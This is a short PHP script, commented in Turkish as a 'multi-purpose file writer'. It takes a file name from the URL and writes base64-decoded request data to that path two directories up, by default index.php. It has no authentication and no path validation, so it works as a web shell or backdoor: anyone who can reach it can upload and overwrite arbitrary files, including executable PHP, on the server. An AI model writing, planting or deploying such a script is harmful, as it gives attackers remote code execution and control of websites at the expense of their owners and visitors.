<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
// Çok amaçlı dosya yazıcı
$target = isset($_GET['target']) ? $_GET['target'] : 'index.php';
$targetPath = "../../" . $target; // Root dizinine göre hedef

echo "Hedef: " . $targetPath . "\n";

$data = file_get_contents('php://input');

if ($data) {
    $decoded = base64_decode($data);
    if (file_put_contents($targetPath, $decoded)) {
        echo "BASARI: " . $target . " yazildi. Boyut: " . strlen($decoded);
    } else {
        echo "HATA: Yazma izni yok veya yol gecersiz.";
    }
} else {
    echo "Veri gelmedi.";
}
?>